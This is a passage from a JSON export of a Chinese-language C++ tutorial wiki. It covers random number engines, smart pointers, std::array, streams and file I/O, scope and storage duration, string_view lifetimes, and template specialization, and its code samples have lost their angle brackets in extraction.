device; std::mt19937 enginedevice(); std::uniform_int_distributionint dice1, 6; std::cout dice(engine) ; 分布对象负责映射范围，随机引擎负责状态；随机数不等同于密码学随机性。 使用 Mersenne Twister 生成随机数std::mt19937 周期长、速度稳定，适合模拟和一般随机任务，但不具备密码学安全性。 种子决定整个序列；测试可以固定种子，生产模拟可用 seed_seq 组合足够的种子材料。 std::mt19937 状态较大、周期很长，适合一般模拟与游戏随机，不适合密码学用途。引擎对象应持续存在并由分布重复调用。固定种子用于可重复测试，非确定性播种能改变序列起点，却不能提高算法本身的安全等级。 复用引擎并固定分布范围 #include iostream#include randomint main() std::mt19937 engine12345; std::uniform_int_distributionint roll1, 100; for (int count; count 3; ++count) std::cout roll(engine) ; 示例固定种子便于测试重复；生产代码应依据需求选择种子来源和可重复性策略。 全局随机数封装集中封装随机引擎可以避免每次调用重新播种，并统一分布接口。 全局共享引擎仍是可变状态；并发程序需要同步、线程局部引擎或显式传递随机源。 随机封装应拥有或借用一个长期存活的引擎，并让调用方选择分布参数。把引擎作为依赖注入后，测试可以提供固定状态，生产入口再负责播种。隐藏的全局引擎会让并发、重放和测试隔离变得困难。 封装随机策略而不是暴露全局引擎 #include iostream#include randomclass Dicepublic: explicit Dice(std::uint32_t seed) : m_engineseed int roll() return m_distribution(m_engine); private: std::mt19937 m_engine; std::uniform_int_distributionint m_distribution1, 6;;int main() Dice dice7; std::cout dice.roll() ; 引擎状态属于 Dice 对象，测试可以注入固定种子；不要把可变随机状态隐藏成共享全局变量。 向测试注入固定随机引擎 int roll(std::mt19937 engine) std::uniform_int_distributionint distribution1, 6; return distribution(engine);std::mt19937 test_engine42;const int repeatableroll(test_engine); 函数不隐藏全局引擎，测试可以使用固定种子，正式程序则在更外层选择种子来源。 测试可注入固定种子获得可重复序列，实际程序再按用途选择种子来源；标准伪随机引擎不提供密码学安全保证。 参考资料 LearnCpp 8.13：随机数生成 LearnCpp 8.14：使用 Mersenne Twister 生成随机数 LearnCpp 8.15：全局随机数封装 cppreference：控制流相关条目","tags":[null,null]},{"title":"unique_ptr、shared_ptr 与 weak_ptr","path":"/wiki/cpp/cpp-topic-smart-pointers.html","content":"std::unique_ptr 表达单一所有者并通过移动转移责任，std::shared_ptr 使用控制块管理真实共同所有权，std::weak_ptr 则观察共享对象而不增加强引用计数。把所有借用都改成共享所有权，会掩盖实际生命周期关系。 std::unique_ptrunique_ptr 表示独占所有权，不可复制但可移动，离开作用域时自动删除目标。 使用 make_unique 创建对象；借用对象时传引用或观察指针，不要把 unique_ptr 作为只读借用参数。 std::unique_ptr 把独占所有权写进类型，只能移动不能复制。接收 unique_ptr 值的函数表示取得所有权，接收 T 或 T* 的函数只借用对象；只为读取对象而传递智能指针，会把实现细节错误地扩散进接口。 unique_ptr 的拥有与借用接口 #include iostream#include memoryvoid observe(const int value) std::cout value ; int main() auto ownerstd::make_uniqueint(7); observe(*owner); auto next_ownerstd::move(owner); std::cout *next_owner ; 拥有权通过移动转移，普通观察函数只接受引用；不要为只读借用传递 unique_ptr。 在接口中表达所有权转移 std::unique_ptrTask make_task();void submit(std::unique_ptrTask task);auto taskmake_task();submit(std::move(task)); make_task 创建唯一所有者，submit 接管所有权；移动后原指针为空但仍可析构和重新赋值。 所有权转移使用 unique_ptr 值，只读或修改现有对象使用引用；借用接口不应迫使调用方暴露具体所有者类型。 std::shared_ptrshared_ptr 通过控制块管理共享所有者计数，最后一个所有者释放对象。 使用 make_shared，并避免从同一裸指针创建多个独立控制块；共享所有权会增加生命周期推理成本。 std::shared_ptr 共享的是控制块中的所有权计数，不只是同一个地址。只有确实存在多个独立所有者时才使用它；从同一裸指针分别构造多个控制块会导致重复销毁。std::make_shared 通常用一次分配建立对象和控制块。 shared_ptr 共享同一控制块 #include iostream#include memoryint main() auto firststd::make_sharedint(42); std::shared_ptrint secondfirst; std::cout *second first.use_count() ; make_shared 同时创建对象和控制块；不能从同一裸指针分别构造多个 shared_ptr。 只在共同延长生命周期时共享所有权 auto taskstd::make_sharedTask();Scheduler schedulertask;Monitor monitortask;// scheduler 与 monitor 都会独立延长 task 的生命周期。 两个组件都需要在各自生命周期内保存任务时，共享控制块符合所有权关系；只在调用期间观察任务的接口仍应接收引用。 共享计数用于真实共同所有权，不用于解决普通借用生命周期；所有权图中的回边需要 weak_ptr，否则会形成环。 shared_ptr 循环依赖与 weak_ptr互相持有 shared_ptr 会形成所有权环，使引用计数无法归零。 weak_ptr 观察共享对象但不增加所有者数量，使用前通过 lock 获取临时 shared_ptr。 std::weak_ptr 观察 shared 所有权而不增加强引用计数，适合缓存、观察者和所有权图中的回边。访问前调用 lock()，成功时得到一个临时 shared_ptr，它保证对象在本次使用期间存活；直接依赖 expired() 后再访问存在检查与使用之间的竞态窗口。 weak_ptr 打破所有权环 #include iostream#include memorystruct Node int value; std::shared_ptrNode child; std::weak_ptrNode parent;;int main() auto parentstd::make_sharedNode(); parent-value = 1; parent-child = std::make_sharedNode(); parent-child-value = 2; parent-child-parent = parent; if (auto lockedparent-child-parent.lock()) std::cout locked-value ; parent 使用 weak_ptr 观察上级而不增加所有者计数；lock 成功后得到临时 shared_ptr 保证本次访问期间对象存活。 用 weak_ptr 表达非拥有回边 struct Node std::shared_ptrNode child; std::weak_ptrNode parent;; child 维持拥有关系，parent 只观察；访问 parent 前通过 lock 获取临时 shared_ptr。 lock() 的结果在使用期间维持对象存活，失败则按对象已消失处理；不要把 expired() 与后续访问分成两个没有同步的步骤。 参考资料 LearnCpp 22.5：std::unique_ptr LearnCpp 22.6：std::shared_ptr LearnCpp 22.7：shared_ptr 循环依赖与 weak_ptr cppreference：移动语义与智能指针相关条目","tags":[null,null]},{"title":"std::array、固定长度与引用数组","path":"/wiki/cpp/cpp-topic-std-array.html","content":"std::arrayT, N 的长度 N 是类型的一部分，因此不同长度的数组是不同类型。它支持值传递、迭代器和结构化容器接口；需要保存引用时，可以显式使用 std::reference_wrapper，而不是创建不存在的原生引用数组。 std::arraystd::arrayT, N 封装固定长度连续数组，长度 N 是类型的一部分。 它支持标准容器接口、聚合初始化和按值语义，不会退化为指针。 std::arrayT, N 把固定长度纳入类型，拥有内嵌连续元素，并支持容器接口和整体复制。长度为零也是有效类型，但不能访问 front() 或下标。与 C 数组不同，它作为函数参数不会自动退化为指针。 固定长度 std::array #include array#include iostreamint main() constexpr std::array values2, 4, 6; std::cout values.front() values.back() ; std::array 不进行动态分配，长度进入类型，并支持标准容器接口。 std::array 长度与索引size 返回编译期固定长度，operator[] 不检查边界，at 在运行期检查。 std::get 使用编译期索引并在越界时直接形成编译错误。 std::array::size() 返回无符号长度，下标接口不检查边界，at() 则在越界时抛出异常。编译期已知的索引还可使用 std::getI 获得编译期检查。循环通常直接用范围 for 或迭代器，减少有符号性转换。 array::at 的边界检查 #include array#include iostreamint main() const std::array values2, 4, 6; for (std::size_t index; index values.size(); ++index) std::cout values.at(index) ; operator[] 不检查边界，at 越界时抛出 out_of_range；固定长度仍不能替代索引校验。 传递与返回 std::array不同长度的 std::array 是不同类型，模板或 std::span 可以接受多种长度。 小型 array 按值返回通常合理，大型或昂贵元素应结合复制成本选择引用或移动。 std::array 按值传参会复制全部元素，按 const 引用可借用固定类型数组。不同长度是不同类型，泛型函数可把长度作为模板参数；只关心连续元素而不关心编译期长度时，std::span 提供统一接口。 用 span 接受任意连续整数范围 #include array#include iostream#include spanint sum(std::spanconst int values) int result; for (int value : values) result += value; return result;int main() std::cout sum(std::array2, 4, 6) ; span 不拥有元素，可同时接受 array、vector 和 C 数组；来源必须覆盖整个调用期。 类类型 std::array 与花括号省略std::array 的元素可以是类类型，聚合和嵌套聚合初始化需要正确匹配花括号层次。 类模板实参推导对同类型元素很方便，但混合类型不会自动选择共同类型。 元素为类类型时，std::array 仍按成员顺序初始化每个对象。花括号层级曾受聚合实现细节影响，现代标准和主流编译器通常允许简洁形式，但明确写出元素对象能避免构造参数与数组外层混淆。 类类型 array 的逐元素初始化 #include array#include iostreamstruct Point int x; int y; ;int main() const std::arrayPoint, 2 points1, 2, 3, 4; std::cout points[1].x ; 额外花括号能明确外层 array 与内层元素聚合的初始化层级。 使用 reference_wrapper 构造引用数组原生数组和 std::array 不能直接保存引用，但可以保存 std::reference_wrapper。 reference_wrapper 可复制和重新绑定，却不拥有目标；所有被引用对象必须保持有效。 C++ 引用不能作为数组元素，因为引用不可默认构造和改绑。std::reference_wrapperT 是可复制、可重新赋向的借用包装，可放入容器。它不延长对象生命周期，容器中的每个包装仍依赖原对象存活。 引用数组使用 reference_wrapper #include array#include functional#include iostreamint main() int first1, second2; std::arraystd::reference_wrapperint, 2 refsfirst, second; refs[0].get() = 7; std::cout first ; C++ 数组不能直接保存引用，reference_wrapper 是可复制的引用包装；被引用对象仍必须保持有效。 std::array 与枚举索引作用域枚举可以为固定数组索引命名，避免散落的魔法数字。 将枚举转换为 size_t 前应保证值来自有效枚举器，并让计数值与数组长度在编译期一致。 用作用域枚举命名 array 下标能让槽位含义可读，转换函数集中处理底层整数。若枚举值不连续或来自外部输入，不能直接作为下标。编译期长度可以由 count 项确定，并用静态断言维护映射数量。 array 与枚举索引绑定 #include array#include cstddef#include iostreamenum class Channel left, right, count ;int main() std::arraydouble, static_caststd::size_t(Channel::count) gain1.0, 0.8; std::cout gain[static_caststd::size_t(Channel::right)] ; 枚举成员提供领域名称，count 哨兵提供长度；转换集中到访问边界。 参考资料 LearnCpp 17.1：std::array LearnCpp 17.2：std::array 长度与索引 LearnCpp 17.3：传递与返回 std::array LearnCpp 17.4：类类型 std::array 与花括号省略 LearnCpp 17.5：使用 reference_wrapper 构造引用数组 LearnCpp 17.6：std::array 与枚举索引 cppreference：固定数组与 C 风格数组相关条目","tags":[null,null]},{"title":"输入输出流、格式状态与字符串流","path":"/wiki/cpp/cpp-topic-streams.html","content":"C++ 流不是无状态的格式化函数。字符序列来自关联缓冲区，格式标志控制后续读写，状态位记录失败、文件结束和严重错误。字符串流复用同一接口在内存文本上读写，适合组合已有的流式运算符。 输入输出流标准库用 istream、ostream 和 iostream 抽象顺序字节流，具体来源可以是终端、字符串或文件。 cin、cout、cerr 和 clog 是预连接标准流；缓冲与刷新策略不同。 流把缓冲区、格式状态和错误状态封装在一个对象中。一次 IO 操作可能设置 eofbit、failbit 或 badbit，布尔检查关注的是流是否仍可继续执行预期操作。状态属于具体流对象，因此格式标志和错误恢复也会影响后续读写。 流把格式化与数据源分离 #include iostream#include sstreamvoid write(std::ostream out, int value) out value= value ; int main() std::ostringstream buffer; write(buffer, 7); std::cout buffer.str(); 同一 write 函数可以写终端、文件或字符串流，调用方决定实际目标。 把一条记录限制在一行内解析 std::optionalRecord parse_record(std::string_view line) std::istringstream inputstd::stringline; Record record; if (!(input record.id record.value std::ws) || !input.eof()) return std::nullopt; return record; 函数同时检查字段转换和尾随内容，并用 optional 区分有效记录与解析失败。 状态化流适合连续格式化和自定义类型组合；记录协议仍应定义字段边界、编码和失败后的恢复位置。 istream 输入operator 执行格式化提取并默认跳过空白，getgetline 等成员支持字符和行级读取。 混用提取与 getline 时要处理残留分隔符，外部输入始终需要状态和范围校验。 输入流提取根据目标类型解析字符，并更新状态位。连续 适合空白分隔字段，getline 适合先建立记录边界；混用时要处理残留换行。循环条件应执行真实读取，成功后再验证字段组合和范围。 整行读取后再解析字段 #include iostream#include sstream#include stringint main() std::string line; if (!std::getline(std::cin, line)) return 1; std::istringstream inputline; int count; double price; if (!(input count price std::ws) || !input.eof()) return 1; std::cout count * price ; getline 建立一条记录的边界，字符串流执行类型转换并检查尾随字符。 把一条记录限制在一行内解析 std::optionalRecord parse_record(std::string_view line) std::istringstream inputstd::stringline; Record record; if (!(input record.id record.value std::ws) || !input.eof()) return std::nullopt; return record; 函数同时检查字段转换和尾随内容，并用 optional 区分有效记录与解析失败。 提取一个字段成功不等于整条记录有效，行边界、尾随内容和业务范围仍需检查。 ostream 与 ios 输出输出操纵器可以设置进制、精度、宽度、填充和浮点格式。 多数格式标志会持续保留，setw 通常只影响下一项；复用外部流的函数应恢复修改过的状态。 输出流保存格式标志、精度、填充和区域设置，这些状态可能影响后续插入。局部格式化可先写入 ostringstream，或保存并恢复共享流状态。C++20 format 与 C++23 print 提供另一种格式化路径，但不替代所有状态化流接口。 保存并恢复输出流格式状态 #include iomanip#include iostreamvoid print_money(std::ostream out, double value) const auto flagsout.flags(); const auto precisionout.precision(); out std::fixed std::setprecision(2) value; out.flags(flags); out.precision(precision);int main() print_money(std::cout, 3.5); std::cout ; 多数格式标志会保留在流中，复用外部流的函数应恢复自己修改的状态。 把一条记录限制在一行内解析 std::optionalRecord parse_record(std::string_view line) std::istringstream inputstd::stringline; Record record; if (!(input record.id record.value std::ws) || !input.eof()) return std::nullopt; return record; 函数同时检查字段转换和尾随内容，并用 optional 区分有效记录与解析失败。 输出格式标志会保留在流对象中，共享流上的局部格式修改应保存并恢复，或把格式化限制在独立字符串缓冲区。 C++20 的 std::format 分离格式字符串与输出目标，C++23 的 std::printstd::println 提供直接格式化输出；流仍适合状态化组合和自定义 operator。 字符串流istringstream、ostringstream 和 stringstream 在内存字符串上复用格式化输入输出接口。 它们适合逐行解析和文本组装，复用失败流时既要替换缓冲区也要 clear 状态。 字符串流把流提取与插入应用到内存字符串，适合复用已有 operator 接口或解析多字段记录。只做整数与字符序列转换时，from_charsto_chars 不依赖区域设置且开销更直接。解析后还要检查尾随字符。 字符串流组装和解析文本 #include iostream#include sstream#include stringint main() std::ostringstream output; output id= 7 ;active= std::boolalpha true; const std::string recordoutput.str(); std::cout record ; ostringstream 拥有内部字符串并复用 ostream 格式化接口；复用失败的输入流时还需 clear 状态。 把一条记录限制在一行内解析 std::optionalRecord parse_record(std::string_view line) std::istringstream inputstd::stringline; Record record; if (!(input record.id record.value std::ws) || !input.eof()) return std::nullopt; return record; 函数同时检查字段转换和尾随内容，并用 optional 区分有效记录与解析失败。 字符串流适合组合已有流接口；只做无区域设置的数字转换时，from_charsto_chars 通常更直接且不分配流对象。 参考资料 LearnCpp 28.1：输入输出流 LearnCpp 28.2：istream 输入 LearnCpp 28.3：ostream 与 ios 输出 LearnCpp 28.4：字符串流 cppreference：输入输出相关条目","tags":[null,null]},{"title":"作用域、存储期与共享状态","path":"/wiki/cpp/cpp-topic-scope-and-lifetime.html","content":"作用域回答名称在哪里可见，存储期回答对象存在多久，链接性回答不同声明是否指向同一实体。局部、静态局部和命名空间作用域对象的组合，决定状态何时初始化、由谁访问以及何时销毁。 概念索引 主题 规则边界 复合语句与代码块 花括号把多条语句组成一个复合语句，并建立块作用域。 局部变量 局部变量只在声明所在块及其子块可见，自动对象通常随控制流进入和离开块而构造析构。 全局变量 命名空间作用域变量具有静态存储期，程序启动阶段初始化并在结束阶段销毁。 变量遮蔽 内层作用域声明同名实体会隐藏外层名称，限定名有时可以重新访问被隐藏实体。 可变全局变量的风险 可变全局状态让函数依赖和修改路径变得隐式，增加测试、并发和初始化顺序复杂度。 静态局部变量 静态局部对象只初始化一次，生命周期持续到程序结束，但名称仍受局部作用域限制。 作用域、存储期与链接性 作用域描述名称可见位置，存储期描述对象存活时间，链接性描述跨作用域声明是否指向同一实体。 复合语句与代码块局部对象在离开块时逆序析构，因此代码块也是控制资源生命周期的工具。 复合语句让多条语句在语法上成为一个整体，并建立新的块作用域。除了服务控制流，额外代码块还能主动缩短锁、文件和临时缓冲区的生命周期。离开块的任何路径都会触发自动对象逆序析构。 代码块同时组织作用域和资源释放 #include iostream#include stringint main() std::string message; std::string temporaryready; message = temporary; std::cout message ; temporary 在内层块结束时析构；花括号不仅是视觉缩进，也决定对象生命周期。 局部变量尽量在首次需要的位置初始化变量，可以缩短无效状态存在时间并减少名称冲突。 局部变量靠近第一次使用位置初始化，可以缩短未使用或无效状态存在的时间。自动存储期对象通常随控制流进入和离开块构造、析构；static 局部变量虽名称局部，却拥有贯穿程序的存储期。 在首次使用处初始化局部变量 #include iostreamint main() const int input4; const int squaredinput * input; std::cout squared ; 局部对象在最小需要范围内初始化，减少无效状态和名称冲突。 全局变量跨翻译单元动态初始化顺序存在限制，依赖其他全局对象可能形成静态初始化顺序问题。 命名空间作用域对象具有静态存储期，在 main 前初始化、程序结束时销毁。常量全局配置比可变共享状态容易管理，但跨翻译单元的动态初始化顺序仍可能形成依赖问题；函数局部静态对象常用于延迟到首次使用。 用对象封装共享状态 #include iostreamnamespaceint requests;void record_request() ++requests; int main() record_request(); std::cout requests ; 示例中的状态仅限当前翻译单元；可变全局状态仍让依赖隐式化，长期接口应优先显式传递对象。 变量遮蔽遮蔽会降低审查和调试可读性，高警告级别通常可以检测此类命名。 内层声明可以隐藏外层同名实体，代码仍能编译，却容易让读写落到错误对象。参数、成员和局部变量的命名约定应保持清楚，高警告级别也可把意外遮蔽变成诊断。刻意遮蔽只应出现在边界很小且含义明确的作用域。 避免同名遮蔽造成误读 #include iostreamint main() const int limit10; const int local_limit3; std::cout local_limit / limit ; 使用不同名称比依赖作用域解析更易审查；编译器的 shadow 警告可以作为额外检查。 可变全局变量的风险把状态封装进对象并显式传递依赖，可以限制写入者并建立不变量。 可变全局对象把依赖隐藏在函数签名之外，任何可见位置都可能改写它。并发访问、测试隔离和初始化顺序会因此相互耦合。把状态放进有明确所有者的对象，再通过引用注入需要它的函数，可以从接口直接看到读写关系。 把可变全局改成显式依赖 #include iostreamstruct Metrics int requests; ;void record(Metrics metrics) ++metrics.requests; int main() Metrics metrics; record(metrics); std::cout metrics.requests ; 调用方拥有 Metrics 并显式传入，测试可以为每个用例创建独立状态。 显式传递可变状态 struct Session int request_count; ;void record_request(Session session) ++session.request_count; 状态的写入者和生命周期由参数关系表达，测试也可以为每个用例创建独立 Session。 静态局部变量C++11 起函数内静态对象初始化是线程安全的，后续并发修改仍需自行同步。 静态局部对象在控制第一次经过声明时初始化，之后所有调用共享同一实例。C++11 起初始化过程保证线程安全，但对象后续的可变访问仍需自行同步。隐藏共享状态会影响测试，因此适合缓存或单例资源时也要明确重置与并发策略。 静态局部对象只初始化一次 #include iostreamint next_id() static int id; return ++id;int main() std::cout next_id() next_id() ; id 的名称仍是局部的，但存储期贯穿整个程序；C++11 起首次初始化具有线程安全保证。 作用域、存储期与链接性三者需要分别分析；名称离开作用域不一定意味着对象立即销毁。 作用域回答名称在哪里可见，存储期回答对象存活多久，链接性回答不同翻译单元中的声明是否指向同一实体。三者可以有不同组合：静态局部对象长期存活却只有局部名称，全局常量又可能默认只有内部链接。 分别分析作用域、存储期和链接性 #include iostreamnamespace int file_value1; int main() int local_value2; std::cout file_value + local_value ; local_value 的名称和对象都局部；file_value 名称受匿名命名空间限制但对象存储期为静态。 限制可变状态的可见范围，通常也会减少初始化顺序、并发访问和测试隔离问题。名称离开作用域与对象结束生命周期仍要分别判断。 参考资料 LearnCpp 7.1：复合语句与代码块 LearnCpp 7.3：局部变量 LearnCpp 7.4：全局变量 LearnCpp 7.5：变量遮蔽 LearnCpp 7.8：可变全局变量的风险 LearnCpp 7.11：静态局部变量 LearnCpp 7.12：作用域、存储期与链接性 cppreference：作用域、存储期与链接性相关条目","tags":[null,null]},{"title":"流状态恢复、文件 I/O 与随机访问","path":"/wiki/cpp/cpp-topic-stream-state-and-files.html","content":"清除流状态位并不会自动移走导致失败的字符，输入恢复需要同时处理状态和缓冲区位置。文件流进一步引入路径、权限、编码、持久化格式和并发写入等外部条件；随机访问只有在记录布局和偏移规则明确时才可靠。 流状态与输入校验goodbit、eofbit、failbit 和 badbit 描述流状态，失败后继续操作前需要按协议恢复。 格式校验后还要检查范围、字段数量和尾随字符；整行读取再解析通常更容易建立记录边界。 eof() 只有在一次读取尝试触及文件尾后才会设置，不能作为读取前的可靠循环条件。循环应直接执行读取并检查结果。格式错误恢复时，clear() 重置状态位，ignore() 或 getline() 才负责越过造成失败的字符。 检查并恢复流状态 #include iostream#include limitsint main() int value; if (!(std::cin value)) std::cin.clear(); std::cin.ignore(std::numeric_limitsstd::streamsize::max(), ); std::cerr invalid integer ; return 1; if (value 0 || value 100) return 2; std::cout value ; 流状态检查解决格式转换失败，后续范围判断解决业务约束；两层校验不能合并为只看 eof。 恢复状态并丢弃失败记录 if (!(std::cin value)) std::cin.clear(); std::cin.ignore(std::numeric_limitsstd::streamsize::max(), ); clear 只重置状态位，ignore 才移除造成转换失败的剩余字符。 恢复失败状态时同时处理状态位和造成失败的输入记录，否则循环会在同一字符处重复失败。 基础文件 IOifstream、ofstream 和 fstream 分别提供文件输入、输出和双向操作，析构时自动关闭文件。 打开模式决定追加、截断和二进制处理；打开成功后仍需检查每次关键读写结果。 成功打开文件不保证后续写入、刷新或关闭一定成功，磁盘空间、权限和设备错误都可能在更晚阶段出现。文本格式还应明确编码和记录边界；需要原子更新时，通常先写临时文件、确认关闭成功，再由平台文件操作替换目标。 用文件流完成写入和逐行读取 #include fstream#include iostream#include stringint main() const char* pathcpp-file-io-sample.txt; std::ofstream outputpath, std::ios::trunc; if (!output) std::cerr open for write failed ; return 1; output alpha beta ; if (!output) std::cerr write failed ; return 2; std::ifstream inputpath; if (!input) std::cerr open for read failed ; return 3; std::string line; while (std::getline(input, line)) std::cout line ; if (!input.eof()) std::cerr read failed ; return 4; ofstream 的作用域结束后自动关闭，随后 ifstream 逐行读取；关键打开、写入和最终读取状态均有独立检查。 把一条记录限制在一行内解析 std::optionalRecord parse_record(std::string_view line) std::istringstream inputstd::stringline; Record record; if (!(input record.id record.value std::ws) || !input.eof()) return std::nullopt; return record; 函数同时检查字段转换和尾随内容，并用 optional 区分有效记录与解析失败。 文件路径、权限、磁盘空间和并发写入都属于外部失败条件；正式格式还要定义编码、版本、原子替换和恢复策略。 随机文件访问seekgtellg 操作读取位置，seekptellp 操作写入位置，偏移可相对开头、当前位置或末尾。 文本模式和变长编码不适合按任意字节定位；二进制格式还必须明确字节序、字段宽度和版本。 随机访问通过 seekgseekp 移动文件位置，再检查流状态。偏移只有在文件格式规定固定记录尺寸、字节序和编码时才可计算。直接写入普通对象内存会携带填充、端序和 ABI 差异，不是可移植格式。 二进制定长记录的定位读取 #include array#include cstdint#include fstream#include iostreamint main() const char* pathcpp-records.bin; const std::arraystd::int32_t, 4 records10, 20, 30, 40; std::ofstream outputpath, std::ios::binary | std::ios::trunc; if (!output) return 1; output.write(reinterpret_castconst char*(records.data()), static_caststd::streamsize(records.size() * sizeof(records[0]))); if (!output) return 2; std::ifstream inputpath, std::ios::binary; if (!input) return 3; constexpr std::size_t index2; input.seekg(static_caststd::streamoff(index * sizeof(std::int32_t)), std::ios::beg); if (!input) return 4; const auto positioninput.tellg(); std::int32_t value; input.read(reinterpret_castchar*(value), sizeof(value)); if (!input) return 5; std::cout position value ; seekg 和 tellg 操作读取位置；示例只在同一实现内演示固定宽度记录，跨平台格式还必须定义字节序、版本和序列化规则。 把字节偏移建立在固定格式上 constexpr std::streamoff record_size16;input.seekg(index * record_size, std::ios::beg);if (!input) return ReadError::seek_failed; 固定记录大小必须由文件格式定义，不能直接假设普通对象布局跨平台稳定。 随机定位只对明确规定记录大小和字节序的文件格式成立，不能把普通 C++ 对象布局直接当作可移植磁盘格式。 直接写入普通 C++ 对象的内存布局不能形成可移植文件格式。长期保存的数据还需要定义字节序、字段宽度、版本演进和写入失败后的恢复策略。 参考资料 LearnCpp 28.5：流状态与输入校验 LearnCpp 28.6：基础文件 IO LearnCpp 28.7：随机文件访问 cppreference：输入输出相关条目","tags":[null,null]},{"title":"std::string、std::string_view 与文本生命周期","path":"/wiki/cpp/cpp-topic-strings-and-views.html","content":"std::string 管理字符存储，适合保存和修改文本；std::string_view 只保存指针与长度，适合在调用链中传递只读视图。复制成本的差异很直观，真正容易出错的地方却是底层存储失效后仍继续使用视图。 std::stringstd::string 拥有字符存储并自动管理长度与生命周期，适合需要保存或修改文本的场景。 它保存的是 char 序列，不自动验证 UTF-8，也不保证一个元素对应一个用户可见字符。 std::string 拥有连续字符存储，负责分配、长度和空终止细节，适合需要保存或修改文本的场景。修改操作可能重新分配，从而使已有指针、引用和 string_view 失效。它按 char 代码单元计数，不自动理解 UTF-8 字符边界。 用 std::string 管理可变文本 #include iostream#include stringint main() std::string pathlogs; path += /today.txt; std::cout path ; std::string 拥有字符存储并管理长度；它保存 char 序列，不自动解释 UTF-8 的用户可见字符。 std::string_viewstd::string_view 是不拥有字符数据的只读视图，复制成本固定且不会延长底层字符串生命周期。 视图只能引用仍然有效且范围未变化的存储，绑定临时 string 或被重分配的缓冲区会产生悬空视图。 std::string_view 保存首地址和长度，不分配、不复制，也不会追加空终止符。按值传递视图通常最直接；真正的成本和风险都在被引用存储上。字符串字面量具有静态存储期，而局部 std::string 的字符缓冲区可能在析构或重分配后立即失效。 以 string_view 借用文本 #include iostream#include string_viewvoid print_name(std::string_view name) std::cout name ;int main() const std::string_view nameworker; print_name(name); string_view 不拥有字符；调用期间底层数组必须保持有效且不发生使地址失效的重分配。 std::string_view 自 C++17 可用；C++20 增加了更多 constexpr 能力，但所有权规则没有变化。 std::string_view 的生命周期与转换string_view 的 remove_prefix 和 remove_suffix 只移动视图边界，不修改底层字符。 需要所有权、空终止保证或跨越来源生命周期保存文本时，应转换为 std::string。 视图切片不会修改来源，只会改变视图保存的起点和长度。需要调用只接受 C 字符串的接口时，不能假设任意子视图以 \\0 结尾；需要跨作用域保存、修改文本或保证空终止时，应显式构造 std::string。 视图切片与所有权转换 #include iostream#include string#include string_viewint main() const std::string sourcekey=value; std::string_view viewsource; view.remove_suffix(5); const std::string ownedview; std::cout owned ; remove_suffix 只移动视图边界；跨越 source 生命周期保存时要构造拥有数据的 std::string。 让视图不超过来源生命周期 void print_name(const std::string storage) const std::string_view viewstorage; std::cout view ; view 只在 storage 存活且未发生使字符存储失效的修改期间有效。 字符串接口是否接收所有权，应由数据需要保存多久来决定。只在调用期间读取可使用视图；需要跨越来源生命周期保存时，应创建拥有存储的 std::string。 参考资料 LearnCpp 5.7：std::string LearnCpp 5.8：std::string_view LearnCpp 5.9：std::string_view 的生命周期与转换 cppreference：常量与字符串相关条目","tags":[null,null]},{"title":"类模板与模板特化","path":"/wiki/cpp/cpp-topic-template-specialization.html","content":"类模板的每组实参形成具体类型。主模板覆盖一般情况，全特化替换一组完整实参，偏特化匹配一类更具体的类型模式。特化能够表达结构差异，也会增加重载、实例化和维护复杂度，约束与普通组合有时更清楚。 概念索引 主题 规则边界 类模板 类模板把类型参数用于成员布局和接口，实例化后每组实参形成独立类型。 模板非类型参数 非类型模板参数把编译期值、指针或受支持的结构值纳入特化。 函数模板特化 全特化为确定模板实参提供独立函数实现，但函数模板不支持偏特化。 类模板特化 类模板全特化为一组确定实参重新定义完整类，主模板成员不会自动继承。 类模板偏特化 偏特化匹配一类模板实参模式，并在多个匹配中选择更特化的版本。 指针类型的偏特化 T* 模式可以为所有指针类型提供特化，但裸指针并不自动表达拥有关系。 类模板完整模板定义通常放在头文件，避免实例化点看不到成员定义。 类模板把表示和操作参数化，每组模板实参形成独立类型。完整定义通常必须在实例化点可见。接口应使用 concepts 或静态断言表达元素要求，并避免把仅某个成员需要的能力强加给整个类模板。 类模板形成一族独立类型 #include array#include cstddef#include iostreamtemplate typename T, std::size_t Sizeclass Buffer public: T operator[](std::size_t index) return m_data[index]; private: std::arrayT, Size m_data; ;int main() Bufferint, 4 buffer; buffer[0] = 7; std::cout buffer[0] ; T 和 Size 都进入实例化类型，完整模板定义需要在使用点可见。 模板非类型参数它们适合固定容量和策略选择，但每个不同值都会形成不同类型并可能增加代码体积。 非类型模板参数把值放进类型身份，可用于固定容量、策略标志和编译期维度。允许的参数种类随标准扩展，但值必须满足模板参数规则。运行期变化的数据不应强行编码成大量实例，否则会增加编译时间和代码体积。 非类型参数固定编译期容量 #include array#include iostreamtemplate auto Valuestruct Constant static constexpr auto valueValue; ;int main() std::cout Constant42::value ; 非类型模板参数必须是编译期可用值；不同 Value 形成不同类型并可能增加实例化代码量。 函数模板特化重载通常比函数模板特化更自然地参与解析，并能用概念表达适用范围。 函数模板全特化只替换一组完整模板实参，不参与普通重载那样的部分排序。许多定制更适合增加非模板重载，让重载解析自然选择。偏特化函数模板不受支持，需要类模板辅助或约束重载。 重载通常比函数模板特化更直接 #include iostream#include string_viewtemplate typename Tvoid print(const T value) std::cout value ; void print(std::string_view value) std::cout value ; int main() print(7); print(std::string_viewtext); 普通重载自然参与解析并可继续约束；函数模板只支持全特化，不支持偏特化。 类模板特化特化与主模板接口一致性由设计者维护，过多特化可能说明抽象不统一。 类模板全特化为一组具体模板实参提供完整替代定义，原模板成员不会自动继承。它适合确实具有不同表示或算法的类型。仅为修补某个表达式错误而特化，往往说明主模板约束或辅助定制点设计不足。 类模板全特化 #include iostreamtemplate typename Tstruct TypeName static constexpr const char* valueother; ;template struct TypeNameint static constexpr const char* valueint; ;int main() std::cout TypeNameint::value ; 全特化为确定实参重新定义完整类，主模板成员不会自动继承。 类模板偏特化主模板必须先声明，偏特化参数仍需能够从匹配模式推导。 类模板偏特化匹配一类实参模式，例如所有指针类型或特定维度范围。编译器会在可行偏特化中选择最专门版本。函数模板不支持偏特化，通常用重载或类模板辅助实现同类分派。约束重叠时应保证排序结果唯一。 类模板偏特化匹配类型模式 #include iostreamtemplate typename Tstruct Kind static constexpr const char* valuevalue; ;template typename Tstruct KindT* static constexpr const char* valuepointer; ;int main() std::cout Kindint*::value ; T* 偏特化匹配所有对象指针类型；多项都匹配时选择更特化的候选。 指针类型的偏特化特化实现仍需处理 const、函数指针和空指针等边界，现代接口常用概念或智能指针区分语义。 指针类型偏特化可为所有 T* 改变表示或操作，但还要考虑 cv 限定、函数指针和空值语义。过宽匹配容易接受不应拥有的地址。现代代码更常通过 concepts、traits 或明确智能指针接口区分能力。 指针特化仍需处理 const #include iostream#include 